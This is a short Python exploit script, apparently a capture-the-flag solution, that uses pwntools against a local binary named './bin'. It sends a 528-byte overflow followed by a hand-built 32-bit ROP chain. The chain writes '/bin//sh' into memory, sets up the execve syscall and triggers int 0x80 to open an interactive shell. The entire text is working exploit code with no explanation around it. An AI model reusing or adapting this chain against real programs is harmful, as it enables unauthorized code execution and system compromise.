from pwn import *
from struct import pack
offset = 528
p = offset*'a'
p += pack('<I', 0x0806f78b) # pop edx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x080b8c66) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0805501b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f78b) # pop edx ; ret
p += pack('<I', 0x080eb064) # @ .data + 4
p += pack('<I', 0x080b8c66) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0805501b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f78b) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x08049433) # xor eax, eax ; ret
p += pack('<I', 0x0805501b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x080df625) # pop ecx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x0806f78b) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x08049433) # xor eax, eax ; ret
p += pack('<I', 0x0807b0a6) # inc eax ; ret
p += pack('<I', 0x0807b0a6) # inc eax ; ret
p += pack('<I', 0x0807b0a6) # inc eax ; ret
p += pack('<I', 0x0807b0a6) # inc eax ; ret
p += pack('<I', 0x0807b0a6) # inc eax ; ret
p += pack('<I', 0x0807b0a6) # inc eax ; ret
p += pack('<I', 0x0807b0a6) # inc eax ; ret
p += pack('<I', 0x0807b0a6) # inc eax ; ret
p += pack('<I', 0x0807b0a6) # inc eax ; ret
p += pack('<I', 0x0807b0a6) # inc eax ; ret
p += pack('<I', 0x0807b0a6) # inc eax ; ret
p += pack('<I', 0x0806d393) # int 0x80

r = process('./bin')
r.recvuntil('system :)')
r.sendline(p)
r.interactive()